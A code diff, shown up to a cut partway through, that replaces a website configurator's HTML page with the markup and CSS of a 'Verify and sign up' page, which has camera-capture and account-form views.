@@ -1,793 +1,454 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>Weblio | Live Website Configurator & Design Tool</title>
-    <meta name="description"
-        content="Professional visual website configurator by Weblio. Real-time design system, theme builder, component layout editor, and JSON configuration exporter.">
-    <link rel="icon"
-        href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⚡</text></svg>">
-    <meta name="theme-color" content="#090a0f">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link
-        href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@400;500;700&family=Inter:wght@300;400;500;600;700;800&family=Merriweather:ital,wght@0,400;0,700;1,300&family=Montserrat:wght@400;600;700;800&family=Orbitron:wght@500;700;900&family=Oswald:wght@500;700&family=Playfair+Display:ital,wght@0,600;0,800;1,400&family=Poppins:wght@400;500;600;700;800&family=Roboto:wght@400;500;700&family=Sora:wght@400;600;700;800&family=Space+Grotesk:wght@500;600;700&display=swap"
-        rel="stylesheet">
-    <link rel="stylesheet" href="style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Verify and sign up</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,600;12..96,800&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0d1029; --panel: #151a3d; --line: #2a3170;
+    --text: #eceffd; --muted: #9aa3d6;
+    --accent: #8b7bff; --accent-2: #5be0c6; --danger: #ff7a7a;
+    --display: "Bricolage Grotesque", "Segoe UI", system-ui, sans-serif;
+    --body: "DM Sans", "Segoe UI", system-ui, sans-serif;
+    color-scheme: dark;
+  }
+  * { box-sizing: border-box; margin: 0; }
+  html, body { height: 100%; }
+  body {
+    font-family: var(--body); color: var(--text);
+    background:
+      radial-gradient(60rem 40rem at 85% -10%, #2a2470 0%, transparent 60%),
+      radial-gradient(40rem 30rem at -10% 110%, #123a4a 0%, transparent 60%), var(--bg);
+    display: grid; place-items: center;
+    padding: max(1.25rem, env(safe-area-inset-top)) 1.25rem max(1.25rem, env(safe-area-inset-bottom));
+    overflow-x: hidden;
+  }
+  .card {
+    width: 100%; max-width: 30rem; background: var(--panel);
+    border: 1px solid var(--line); border-radius: 1.5rem;
+    padding: 2.25rem 2rem 2rem; box-shadow: 0 30px 80px -20px rgba(0,0,0,.6);
+    animation: rise .7s cubic-bezier(.2,.8,.2,1) both;
+  }
+  @keyframes rise { from { opacity: 0; transform: translateY(18px) scale(.98); } }
+
+  .view { display: none; }
+  .card[data-view="camera"] .v-camera,
+  .card[data-view="account"] .v-account,
+  .card[data-view="checking"] .v-checking,
+  .card[data-view="ok"] .v-ok,
+  .card[data-view="blocked"] .v-blocked,
+  .card[data-view="error"] .v-error { display: block; }
+
+  h1 { font-family: var(--display); font-weight: 800; font-size: clamp(1.8rem, 6vw, 2.3rem); line-height: 1.05; letter-spacing: -.02em; margin-bottom: .75rem; }
+  .lede { color: var(--muted); line-height: 1.55; margin-bottom: 1.5rem; max-width: 38ch; }
+
+  button, .btn {
+    display: block; width: 100%; text-align: center; text-decoration: none;
+    font: 600 1.05rem var(--body); color: #0d1029;
+    background: linear-gradient(135deg, var(--accent), #a99dff);
+    border: 0; border-radius: .9rem; padding: 1rem; cursor: pointer;
+    transition: transform .15s, opacity .2s, box-shadow .2s;
+  }
+  button:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 10px 30px -10px var(--accent); }
+  button:focus-visible, .btn:focus-visible { outline: 3px solid var(--accent-2); outline-offset: 3px; }
+  button:disabled { opacity: .35; cursor: not-allowed; }
+  button.ghost { background: transparent; color: var(--text); border: 1.5px solid var(--line); margin-top: .7rem; }
+  .leave { display: block; text-align: center; margin-top: 1rem; font-size: .9rem; color: var(--muted); }
+  .leave:hover { color: var(--text); }
+  .fine { margin-top: 1.25rem; font-size: .78rem; color: #737cb8; line-height: 1.5; }
+
+  /* ---- Camera ---- */
+  .cam { position: relative; width: 100%; aspect-ratio: 1; border-radius: 1.2rem; overflow: hidden; background: #05061a; margin-bottom: 1rem; }
+  .cam video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); display: block; }
+  .cam .mask { position: absolute; inset: 0; width: 100%; height: 100%; }
+  .cam .oval { fill: none; stroke: var(--accent); stroke-width: 3; stroke-dasharray: 10 8; transition: stroke .3s; }
+  .cam.live .oval { stroke: var(--accent-2); stroke-dasharray: none; }
+  .cam .wait { position: absolute; inset: 0; display: grid; place-items: center; color: var(--muted); font-size: .95rem; background: #05061a; }
+  .cam.live .wait { display: none; }
+  .status { text-align: center; min-height: 1.4rem; font-size: .95rem; color: var(--muted); margin-bottom: 1rem; }
+
+  /* ---- Form ---- */
+  .thumb { display: flex; align-items: center; gap: .9rem; margin-bottom: 1.5rem; }
+  .thumb img { width: 3.6rem; height: 3.6rem; border-radius: 50%; object-fit: cover; border: 2px solid var(--accent-2); transform: scaleX(-1); }
+  .thumb b { display: block; font-size: .95rem; }
+  .thumb button { display: inline; width: auto; padding: 0; margin: 0; background: none; color: var(--accent); font: 500 .85rem var(--body); text-decoration: underline; border-radius: 0; }
+  .thumb button:hover { box-shadow: none; transform: none; }
+  .field { margin-bottom: 1rem; }
+  .field label { display: block; font-weight: 600; font-size: .9rem; margin-bottom: .4rem; }
+  .field .wrap { position: relative; }
+  .field input {
+    width: 100%; font: 500 1rem var(--body); color: var(--text);
+    background: var(--bg); border: 1.5px solid var(--line); border-radius: .9rem;
+    padding: .9rem 1rem; outline: none; transition: border-color .2s, box-shadow .2s;
+  }
+  .field input:focus-visible { border-color: var(--accent); box-shadow: 0 0 0 4px rgba(139,123,255,.25); }
+  .field.bad input { border-color: var(--danger); }
+  .field .err { display: none; color: var(--danger); font-size: .82rem; margin-top: .35rem; }
+  .field.bad .err { display: block; }
+  .toggle { position: absolute; right: .5rem; top: 50%; transform: translateY(-50%); width: auto !important; padding: .4rem .7rem !important; background: none !important; color: var(--muted) !important; font: 500 .82rem var(--body) !important; box-shadow: none !important; }
+  .formerr { min-height: 1.3rem; color: var(--danger); font-size: .9rem; margin-bottom: .6rem; }
+
+  /* ---- Results ---- */
+  .icon { width: 4.5rem; height: 4.5rem; margin-bottom: 1.25rem; }
+  .icon svg { width: 100%; height: 100%; }
+  .spinner { width: 3.2rem; height: 3.2rem; border: 4px solid var(--line); border-top-color: var(--accent); border-radius: 50%; margin: .5rem 0 1.5rem; animation: spin .9s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  @media (max-width: 26rem) { .card { padding: 1.75rem 1.25rem 1.5rem; } }
+  @media (prefers-reduced-motion: reduce) { * { animation: none !important; transition: none !important; } }
+</style>
 </head>
+<body>
+<main class="card" id="card" data-view="camera" aria-live="polite">
 
-<body class="configurator-app">
-    <!-- Top Application Bar -->
-    <header class="app-header">
-        <div class="app-header-left">
-            <div class="app-logo">
-                <span class="app-logo-mark">⚡</span>
-                <div class="app-logo-text">
-                    <strong>WEBLIO</strong>
-                    <span>Configurator Studio v2.5</span>
-                </div>
-            </div>
-
-            <div class="preset-dropdown-wrapper">
-                <label for="preset-select" class="sr-only">Design Presets</label>
-                <select id="preset-select" class="app-select">
-                    <option value="" disabled selected>⚡ Load Design Preset...</option>
-                    <option value="modern-restaurant">1. Modern Restaurant</option>
-                    <option value="luxury-barber">2. Luxury Barber Shop</option>
-                    <option value="dark-auto">3. Dark Auto Detailing</option>
-                    <option value="neon-gym">4. Neon Fitness Gym</option>
-                    <option value="minimal-cafe">5. Minimal Artisan Café</option>
-                    <option value="premium-salon">6. Premium Beauty Salon</option>
-                    <option value="corporate-build">7. Corporate Construction</option>
-                    <option value="elegant-photo">8. Elegant Studio Photography</option>
-                    <option value="futuristic-tech">9. Futuristic Tech Studio</option>
-                    <option value="clean-local">10. Clean Local Business</option>
-                </select>
-            </div>
-
-            <button type="button" id="btn-randomize" class="app-btn app-btn-secondary" title="Generate coherent design">
-                <span>🎲</span> Randomize
-            </button>
-        </div>
-
-        <div class="app-header-center">
-            <div class="device-switcher" role="radiogroup" aria-label="Device Viewport Switcher">
-                <button type="button" class="device-btn is-active" data-device="desktop" title="Desktop View (100%)">
-                    <span>💻</span> <span class="device-label">Desktop</span>
-                </button>
-                <button type="button" class="device-btn" data-device="tablet" title="Tablet View (768px)">
-                    <span>📱</span> <span class="device-label">Tablet</span>
-                </button>
-                <button type="button" class="device-btn" data-device="mobile" title="Mobile View (375px)">
-                    <span>📲</span> <span class="device-label">Mobile</span>
-                </button>
-            </div>
-
-            <div class="zoom-controls">
-                <button type="button" id="zoom-out" class="icon-btn" title="Zoom Out">-</button>
-                <span id="zoom-level">100%</span>
-                <button type="button" id="zoom-in" class="icon-btn" title="Zoom In">+</button>
-                <button type="button" id="zoom-reset" class="icon-btn" title="Reset Zoom">⟲</button>
-            </div>
-        </div>
-
-        <div class="app-header-right">
-            <button type="button" id="btn-toggle-sidebar" class="app-btn app-btn-icon mobile-only"
-                title="Toggle Controls">
-                <span>⚙️</span>
-            </button>
-            <button type="button" id="btn-save-local" class="app-btn app-btn-secondary" title="Save to Browser">
-                <span>💾</span> Save
-            </button>
-            <button type="button" id="btn-load-local" class="app-btn app-btn-secondary" title="Load Saved Config">
-                <span>📂</span> Load
-            </button>
-            <button type="button" id="btn-reset-all" class="app-btn app-btn-ghost" title="Reset to Defaults">
-                <span>⟲</span> Reset
-            </button>
-            <button type="button" id="btn-export-json" class="app-btn app-btn-primary">
-                <span>📥</span> Export Config
-            </button>
-        </div>
-    </header>
-
-    <!-- Main Workspace Area -->
-    <div class="app-workspace">
-
-        <!-- Left Controls Sidebar -->
-        <aside class="config-sidebar" id="config-sidebar">
-            <div class="sidebar-header">
-                <div class="sidebar-search">
-                    <span class="search-icon">🔍</span>
-                    <input type="search" id="control-search"
-                        placeholder="Search settings (e.g. font, radius, color)...">
-                </div>
-            </div>
-
-            <!-- Navigation Category Tabs -->
-            <nav class="category-tabs" id="category-tabs">
-                <button type="button" class="tab-btn is-active" data-tab="business">🏢 Business</button>
-                <button type="button" class="tab-btn" data-tab="colors">🎨 Colors</button>
-                <button type="button" class="tab-btn" data-tab="typography">🔤 Type</button>
-                <button type="button" class="tab-btn" data-tab="style">✨ Style</button>
-                <button type="button" class="tab-btn" data-tab="navbar">🧭 Navbar</button>
-                <button type="button" class="tab-btn" data-tab="hero">🚀 Hero</button>
-                <button type="button" class="tab-btn" data-tab="components">🔘 Buttons</button>
-                <button type="button" class="tab-btn" data-tab="sections">👁️ Sections</button>
-                <button type="button" class="tab-btn" data-tab="content">✍️ Content</button>
-                <button type="button" class="tab-btn" data-tab="fx">🎭 Effects</button>
-            </nav>
-
-            <!-- Control Category Panes -->
-            <div class="tab-panes">
-
-                <!-- 1. BUSINESS TYPE PANE -->
-                <div class="tab-pane is-active" id="pane-business">
-                    <div class="control-group">
-                        <label for="business-type-select" class="group-title">Business Category</label>
-                        <p class="group-hint">Selecting a business type automatically loads specialized imagery, service
-                            offerings, and copy into the live preview.</p>
-                        <select id="business-type-select" class="control-select">
-                            <option value="restaurant">🍽️ Restaurant & Fine Dining</option>
-                            <option value="cafe">☕ Café & Coffee Shop</option>
-                            <option value="barber">💈 Barber Shop & Grooming</option>
-                            <option value="salon">💇‍♀️ Hair & Beauty Salon</option>
-                            <option value="auto">🚗 Auto Repair & Service</option>
-                            <option value="detailing">✨ Car Detailing Studio</option>
-                            <option value="gym">🏋️‍♂️ Fitness Gym & Health Club</option>
-                            <option value="trainer">🏃‍♂️ Personal Trainer</option>
-                            <option value="dentist">🦷 Dental Clinic</option>
-                            <option value="construction">🏗️ Construction & Contracting</option>
-                            <option value="cleaning">🧹 Cleaning Service</option>
-                            <option value="photography">📸 Photography Studio</option>
-                            <option value="realestate">🏡 Real Estate Agency</option>
-                            <option value="clothing">👗 Fashion & Clothing Store</option>
-                            <option value="tattoo">🎨 Tattoo Studio</option>
-                            <option value="mechanic">🔧 Mechanic Shop</option>
-                            <option value="freelancer">💼 Freelance Consultant</option>
-                            <option value="other">⭐ Custom Local Business</option>
-                        </select>
-                    </div>
-                </div>
-
-                <!-- 2. COLOR SYSTEM PANE -->
-                <div class="tab-pane" id="pane-colors">
-                    <div class="control-group">
-                        <span class="group-title">Color Palette Presets</span>
-                        <div class="palette-grid" id="palette-presets-grid"></div>
-                    </div>
-
-                    <div class="control-group">
-                        <span class="group-title">Theme Colors</span>
-                        <div class="color-picker-grid">
-                            <div class="color-picker-item">
-                                <label for="c-primary">Primary Brand</label>
-                                <div class="picker-row">
-                                    <input type="color" id="c-primary" data-color-prop="primary">
-                                    <input type="text" id="hex-primary" class="hex-input" data-color-target="primary">
-                                </div>
-                            </div>
-                            <div class="color-picker-item">
-                                <label for="c-secondary">Secondary Accent</label>
-                                <div class="picker-row">
-                                    <input type="color" id="c-secondary" data-color-prop="secondary">
-                                    <input type="text" id="hex-secondary" class="hex-input"
-                                        data-color-target="secondary">
-                                </div>
-                            </div>
-                            <div class="color-picker-item">
-                                <label for="c-accent">Highlight Accent</label>
-                                <div class="picker-row">
-                                    <input type="color" id="c-accent" data-color-prop="accent">
-                                    <input type="text" id="hex-accent" class="hex-input" data-color-target="accent">
-                                </div>
-                            </div>
-                            <div class="color-picker-item">
-                                <label for="c-bg">Page Background</label>
-                                <div class="picker-row">
-                                    <input type="color" id="c-bg" data-color-prop="bg">
-                                    <input type="text" id="hex-bg" class="hex-input" data-color-target="bg">
-                                </div>
-                            </div>
-                            <div class="color-picker-item">
-                                <label for="c-surface">Surface Panel</label>
-                                <div class="picker-row">
-                                    <input type="color" id="c-surface" data-color-prop="surface">
-                                    <input type="text" id="hex-surface" class="hex-input" data-color-target="surface">
-                                </div>
-                            </div>
-                            <div class="color-picker-item">
-                                <label for="c-card">Card Background</label>
-                                <div class="picker-row">
-                                    <input type="color" id="c-card" data-color-prop="card">
-                                    <input type="text" id="hex-card" class="hex-input" data-color-target="card">
-                                </div>
-                            </div>
-                            <div class="color-picker-item">
-                                <label for="c-text">Primary Text</label>
-                                <div class="picker-row">
-                                    <input type="color" id="c-text" data-color-prop="text">
-                                    <input type="text" id="hex-text" class="hex-input" data-color-target="text">
-                                </div>
-                            </div>
-                            <div class="color-picker-item">
-                                <label for="c-muted">Muted Text</label>
-                                <div class="picker-row">
-                                    <input type="color" id="c-muted" data-color-prop="muted">
-                                    <input type="text" id="hex-muted" class="hex-input" data-color-target="muted">
-                                </div>
-                            </div>
-                            <div class="color-picker-item">
-                                <label for="c-border">Borders & Lines</label>
-                                <div class="picker-row">
-                                    <input type="color" id="c-border" data-color-prop="border">
-                                    <input type="text" id="hex-border" class="hex-input" data-color-target="border">
-                                </div>
-                            </div>
-                            <div class="color-picker-item">
-                                <label for="c-button">Button Fill</label>
-                                <div class="picker-row">
-                                    <input type="color" id="c-button" data-color-prop="button">
-                                    <input type="text" id="hex-button" class="hex-input" data-color-target="button">
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- 3. TYPOGRAPHY PANE -->
-                <div class="tab-pane" id="pane-typography">
-                    <div class="control-group">
-                        <label for="heading-font-select" class="group-title">Heading Font Family</label>
-                        <select id="heading-font-select" class="control-select">
-                            <option value="Inter">Inter (Clean Modern)</option>
-                            <option value="Poppins">Poppins (Geometric Sans)</option>
-                            <option value="Montserrat">Montserrat (Bold Modern)</option>
-                            <option value="Sora">Sora (Tech Display)</option>
-                            <option value="Space Grotesk">Space Grotesk (Futuristic)</option>
-                            <option value="Orbitron">Orbitron (Cyber Cyberpunk)</option>
-                            <option value="Playfair Display">Playfair Display (Luxury Serif)</option>
-                            <option value="Merriweather">Merriweather (Classic Serif)</option>
-                            <option value="Oswald">Oswald (Condensed Bold)</option>
-                            <option value="Bebas Neue">Bebas Neue (Impact Display)</option>
-                            <option value="DM Sans">DM Sans (Minimal Swiss)</option>
-                            <option value="Roboto">Roboto (Universal Sans)</option>
-                        </select>
-                    </div>
-
-                    <div class="control-group">
-                        <label for="body-font-select" class="group-title">Body Font Family</label>
-                        <select id="body-font-select" class="control-select">
-                            <option value="Inter">Inter (Universal UI)</option>
-                            <option value="DM Sans">DM Sans (Modern Clean)</option>
-                            <option value="Poppins">Poppins (Friendly Round)</option>
-                            <option value="Roboto">Roboto (Standard Body)</option>
-                            <option value="Sora">Sora (Distinctive Sans)</option>
-                            <option value="Merriweather">Merriweather (Editorial Serif)</option>
-                        </select>
-                    </div>
-
-                    <div class="control-group">
-                        <div class="slider-header">
-                            <label for="heading-scale">Heading Size Scale</label>
-                            <span id="heading-scale-val" class="slider-value">1.0x</span>
-                        </div>
-                        <input type="range" id="heading-scale" min="0.8" max="1.5" step="0.05" value="1.0">
-                    </div>
-
-                    <div class="control-group">
-                        <div class="slider-header">
-                            <label for="body-scale">Body Text Size</label>
-                            <span id="body-scale-val" class="slider-value">16px</span>
-                        </div>
-                        <input type="range" id="body-scale" min="14" max="20" step="1" value="16">
-                    </div>
-
-                    <div class="control-group">
-                        <label for="text-align-select" class="group-title">Hero & Heading Alignment</label>
-                        <select id="text-align-select" class="control-select">
-                            <option value="left">Left Aligned</option>
-                            <option value="center" selected>Center Aligned</option>
-                            <option value="right">Right Aligned</option>
-                        </select>
-                    </div>
-                </div>
-
-                <!-- 4. WEBSITE STYLE & SHAPES PANE -->
-                <div class="tab-pane" id="pane-style">
-                    <div class="control-group">
-                        <span class="group-title">Design Style Presets</span>
-                        <div class="style-presets-grid" id="style-presets-grid"></div>
-                    </div>
-
-                    <div class="control-group">
-                        <div class="slider-header">
-                            <label for="corner-radius">Global Corner Radius</label>
-                            <span id="corner-radius-val" class="slider-value">16px</span>
-                        </div>
-                        <input type="range" id="corner-radius" min="0" max="32" step="2" value="16">
-                    </div>
-
-                    <div class="control-group">
-                        <div class="slider-header">
-                            <label for="button-radius">Button Corner Radius</label>
-                            <span id="button-radius-val" class="slider-value">12px</span>
-                        </div>
-                        <input type="range" id="button-radius" min="0" max="99" step="2" value="12">
-                    </div>
-
-                    <div class="control-group">
-                        <div class="slider-header">
-                            <label for="shadow-strength">Shadow Intensity</label>
-                            <span id="shadow-strength-val" class="slider-value">Medium</span>
-                        </div>
-                        <input type="range" id="shadow-strength" min="0" max="1" step="0.2" value="0.5">
-                    </div>
-                </div>
-
-                <!-- 5. NAVBAR PANE -->
-                <div class="tab-pane" id="pane-navbar">
-                    <div class="control-group">
-                        <label for="navbar-style-select" class="group-title">Navbar Style</label>
-                        <select id="navbar-style-select" class="control-select">
-                            <option value="classic">Classic Full Width</option>
-                            <option value="centered">Centered Navigation</option>
-                            <option value="floating">Floating Glass Capsule</option>
-                            <option value="minimal">Minimal Compact</option>
-                        </select>
-                    </div>
-
-                    <div class="control-group">
-                        <label for="navbar-backdrop-select" class="group-title">Background Surface</label>
-                        <select id="navbar-backdrop-select" class="control-select">
-                            <option value="glass">Blur Glassmorphic</option>
-                            <option value="solid">Solid Panel</option>
-                            <option value="transparent">Transparent Overlay</option>
-                        </select>
-                    </div>
-
-                    <div class="control-group">
-                        <label class="toggle-control">
-                            <input type="checkbox" id="nav-sticky" checked>
-                            <span class="toggle-track"></span>
-                            <span class="toggle-label">Sticky Navigation Bar</span>
-                        </label>
-                    </div>
-                </div>
-
-                <!-- 6. HERO SECTION PANE -->
-                <div class="tab-pane" id="pane-hero">
-                    <div class="control-group">
-                        <label for="hero-layout-select" class="group-title">Hero Layout</label>
-                        <select id="hero-layout-select" class="control-select">
-                            <option value="centered">Centered Focus Title</option>
-                            <option value="split">Split Columns (Text + Image)</option>
-                            <option value="fullscreen">Fullscreen Hero Banner</option>
-                            <option value="minimal">Minimal Header Hero</option>
-                        </select>
-                    </div>
-
-                    <div class="control-group">
-                        <div class="slider-header">
-                            <label for="hero-overlay-strength">Dark Overlay Strength</label>
-                            <span id="hero-overlay-val" class="slider-value">70%</span>
-                        </div>
-                        <input type="range" id="hero-overlay-strength" min="0" max="0.9" step="0.05" value="0.7">
-                    </div>
-
-                    <div class="control-group">
-                        <label for="hero-buttons-count" class="group-title">Call To Action Buttons</label>
-                        <select id="hero-buttons-count" class="control-select">
-                            <option value="2">Two Buttons (Primary + Secondary)</option>
-                            <option value="1">Single Button (Primary Only)</option>
-                        </select>
-                    </div>
-                </div>
-
-                <!-- 7. BUTTONS & CARDS PANE -->
-                <div class="tab-pane" id="pane-components">
-                    <div class="control-group">
-                        <label for="btn-hover-select" class="group-title">Button Hover Animation</label>
-                        <select id="btn-hover-select" class="control-select">
-                            <option value="glow">Glow Ring & Elevation</option>
-                            <option value="lift">Lift & Shadow</option>
-                            <option value="scale">Pulse Scale</option>
-                            <option value="shine">Shine Light Streak</option>
-                            <option value="none">None (Static)</option>
-                        </select>
-                    </div>
-
-                    <div class="control-group">
-                        <label for="card-hover-select" class="group-title">Card Hover Effect</label>
-                        <select id="card-hover-select" class="control-select">
-                            <option value="lift">Lift & Scale Up</option>
-                            <option value="glow">Neon Border Glow</option>
-                            <option value="zoom">Image Zoom</option>
-                            <option value="none">Static</option>
-                        </select>
-                    </div>
-                </div>
-
-                <!-- 8. SECTIONS TOGGLE PANE -->
-                <div class="tab-pane" id="pane-sections">
-                    <div class="control-group">
-                        <span class="group-title">Toggle Active Website Sections</span>
-                        <div class="sections-checkbox-grid">
-                            <label class="toggle-control"><input type="checkbox" data-section-toggle="hero"
-                                    checked><span class="toggle-track"></span><span>Hero Banner</span></label>
-                            <label class="toggle-control"><input type="checkbox" data-section-toggle="about"
-                                    checked><span class="toggle-track"></span><span>About Us</span></label>
-                            <label class="toggle-control"><input type="checkbox" data-section-toggle="services"
-                                    checked><span class="toggle-track"></span><span>Services & Offerings</span></label>
-                            <label class="toggle-control"><input type="checkbox" data-section-toggle="gallery"
-                                    checked><span class="toggle-track"></span><span>Image Gallery</span></label>
-                            <label class="toggle-control"><input type="checkbox" data-section-toggle="testimonials"
-                                    checked><span class="toggle-track"></span><span>Testimonials &
-                                    Reviews</span></label>
-                            <label class="toggle-control"><input type="checkbox" data-section-toggle="pricing"
-                                    checked><span class="toggle-track"></span><span>Pricing & Specials</span></label>
-                            <label class="toggle-control"><input type="checkbox" data-section-toggle="hours"
-                                    checked><span class="toggle-track"></span><span>Hours & Schedule</span></label>
-                            <label class="toggle-control"><input type="checkbox" data-section-toggle="visit"
-                                    checked><span class="toggle-track"></span><span>Location & Map</span></label>
-                            <label class="toggle-control"><input type="checkbox" data-section-toggle="contact"
-                                    checked><span class="toggle-track"></span><span>Contact Form</span></label>
-                            <label class="toggle-control"><input type="checkbox" data-section-toggle="footer"
-                                    checked><span class="toggle-track"></span><span>Footer Section</span></label>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- 9. CONTENT EDITOR PANE -->
-                <div class="tab-pane" id="pane-content">
-                    <div class="control-group">
-                        <label for="inp-business-name">Business Name</label>
-                        <input type="text" id="inp-business-name" class="control-input"
-                            data-content-field="businessName">
-                    </div>
-                    <div class="control-group">
-                        <label for="inp-hero-title">Hero Headline Title</label>
-                        <input type="text" id="inp-hero-title" class="control-input" data-content-field="heroTitle">
-                    </div>
-                    <div class="control-group">
-                        <label for="inp-hero-desc">Hero Description</label>
-                        <textarea id="inp-hero-desc" class="control-textarea" rows="3"
-                            data-content-field="heroDesc"></textarea>
-                    </div>
-                    <div class="control-group">
-                        <label for="inp-phone">Contact Phone Number</label>
-                        <input type="text" id="inp-phone" class="control-input" data-content-field="phone">
-                    </div>
-                    <div class="control-group">
-                        <label for="inp-email">Email Address</label>
-                        <input type="text" id="inp-email" class="control-input" data-content-field="email">
-                    </div>
-                    <div class="control-group">
-                        <label for="inp-address">Address / Location</label>
-                        <input type="text" id="inp-address" class="control-input" data-content-field="address">
-                    </div>
-                    <div class="control-group">
-                        <label for="inp-cta">Primary CTA Button Label</label>
-                        <input type="text" id="inp-cta" class="control-input" data-content-field="ctaText">
-                    </div>
-                </div>
-
-                <!-- 10. ANIMATIONS & FX PANE -->
-                <div class="tab-pane" id="pane-fx">
-                    <div class="control-group">
-                        <label for="fx-preset-select" class="group-title">Animation Intensity</label>
-                        <select id="fx-preset-select" class="control-select">
-                            <option value="modern">Modern Smooth</option>
-                            <option value="subtle">Subalanced / Gentle</option>
-                            <option value="dynamic">Dynamic & Energetic</option>
-                            <option value="extreme">Futuristic Extreme</option>
-                            <option value="none">Static (Disabled)</option>
-                        </select>
-                    </div>
-
-                    <div class="control-group">
-                        <div class="slider-header">
-                            <label for="fx-speed-slider">Global Animation Speed</label>
-                            <span id="fx-speed-val" class="slider-value">1.0x</span>
-                        </div>
-                        <input type="range" id="fx-speed-slider" min="0.5" max="2.0" step="0.1" value="1.0">
-                    </div>
-                </div>
-
-            </div>
-        </aside>
-
-        <!-- Center Live Website Preview Window -->
-        <main class="preview-area">
-            <div class="preview-viewport-wrapper">
-                <div id="device-frame" class="device-frame device-desktop">
-                    <div class="device-top-bar">
-                        <div class="browser-dots">
-                            <span></span><span></span><span></span>
-                        </div>
-                        <div class="browser-address-bar">
-                            <span class="lock-icon">🔒</span>
-                            <span id="preview-url-display">https://yourcompany.weblio.design</span>
-                        </div>
-                    </div>
-
-                    <!-- Live Website Container Rendered In Real Time -->
-                    <div id="website-preview" class="website-preview">
-
-                        <!-- 1. NAVBAR -->
-                        <header id="prev-navbar" class="prev-navbar">
-                            <div class="prev-container nav-inner">
-                                <a href="#prev-hero" class="prev-brand">
-                                    <span class="prev-logo-icon" id="prev-logo-icon">🏪</span>
-                                    <strong id="prev-brand-name">Your Company</strong>
-                                </a>
-
-                                <nav class="prev-nav-links">
-                                    <a href="#prev-about">About</a>
-                                    <a href="#prev-services">Services</a>
-                                    <a href="#prev-gallery">Gallery</a>
-                                    <a href="#prev-reviews">Reviews</a>
-                                    <a href="#prev-contact">Contact</a>
-                                </nav>
-
-                                <div class="prev-nav-actions">
-                                    <a href="tel:+37061488844" class="prev-phone-btn" id="prev-phone-link">📞
-                                        +37061488844</a>
-                                    <a href="#prev-services" class="prev-btn prev-btn-primary" id="prev-nav-cta">View
-                                        Menu ↗</a>
-                                </div>
-                            </div>
-                        </header>
-
-                        <!-- 2. HERO SECTION -->
-                        <section id="prev-hero" class="prev-hero">
-                            <div class="prev-hero-bg">
-                                <img id="prev-hero-bg-img" src="" alt="Hero background">
-                                <div class="prev-hero-overlay" id="prev-hero-overlay"></div>
-                            </div>
-
-                            <div class="prev-container prev-hero-grid">
-                                <div class="prev-hero-copy">
-                                    <p class="prev-eyebrow" id="prev-eyebrow">PREMIUM SERVICE • VILNIUS</p>
-                                    <h1 id="prev-hero-title">WHEN YOU WANT MORE THAN USUAL</h1>
-                                    <p id="prev-hero-desc" class="prev-hero-desc">Experience handcrafted perfection,
-                                        premium ingredients, and lightning-fast customer service every day.</p>
-                                    <div class="prev-hero-actions">
-                                        <a href="#prev-services" class="prev-btn prev-btn-primary"
-                                            id="prev-hero-btn1">ŽIŪRĖTI MENIU ↗</a>
-                                        <a href="tel:+37061488844" class="prev-btn prev-btn-secondary"
-                                            id="prev-hero-btn2">SKAMBINTI DABAR</a>
-                                    </div>
-                                </div>
-
-                                <div class="prev-hero-media" id="prev-hero-media-box">
-                                    <div class="prev-hero-plate">
-                                        <img id="prev-hero-dish-img" src="" alt="Featured item">
-                                    </div>
-                                </div>
-                            </div>
-                        </section>
-
-                        <!-- 3. ABOUT SECTION -->
-                        <section id="prev-about" class="prev-section">
-                            <div class="prev-container prev-about-grid">
-                                <div class="prev-about-media">
-                                    <img id="prev-about-img" src="" alt="About business">
-                                </div>
-                                <div class="prev-about-copy">
-                                    <p class="prev-eyebrow">ABOUT OUR BUSINESS</p>
-                                    <h2 id="prev-about-title">Dedicated to Uncompromising Quality & Passion</h2>
-                                    <p id="prev-about-desc">Located in the heart of the city, we combine years of
-                                        craftsmanship, fresh sourcing, and modern hospitality. Whether you're stopping
-                                        by for a quick lunch or an evening experience, our team is ready.</p>
-                                    <div class="prev-about-stats">
-                                        <div class="prev-stat"><strong
-                                                id="prev-stat-items">50+</strong><span>Offerings</span></div>
-                                        <div class="prev-stat"><strong
-                                                id="prev-stat-score">4.9★</strong><span>Rating</span></div>
-                                        <div class="prev-stat"><strong>7 Days</strong><span>Weekly</span></div>
-                                    </div>
-                                </div>
-                            </div>
-                        </section>
-
-                        <!-- 4. SERVICES / MENU SECTION -->
-                        <section id="prev-services" class="prev-section">
-                            <div class="prev-container">
-                                <div class="prev-section-heading">
-                                    <p class="prev-eyebrow">OUR MENU & OFFERINGS</p>
-                                    <h2>Popular Choices & Client Favourites</h2>
-                                </div>
-
-                                <div class="prev-services-grid" id="prev-services-grid"></div>
-                            </div>
-                        </section>
-
-                        <!-- 5. GALLERY SECTION -->
-                        <section id="prev-gallery" class="prev-section">
-                            <div class="prev-container">
-                                <div class="prev-section-heading">
-                                    <p class="prev-eyebrow">PHOTO GALLERY</p>
-                                    <h2>Behind The Scenes & Signature Creations</h2>
-                                </div>
-
-                                <div class="prev-gallery-grid" id="prev-gallery-grid"></div>
-                            </div>
-                        </section>
-
-                        <!-- 6. TESTIMONIALS SECTION -->
-                        <section id="prev-testimonials" class="prev-section">
-                            <div class="prev-container">
-                                <div class="prev-section-heading">
-                                    <p class="prev-eyebrow">CLIENT REVIEWS</p>
-                                    <h2>What Our Guests Say About Us</h2>
-                                </div>
-
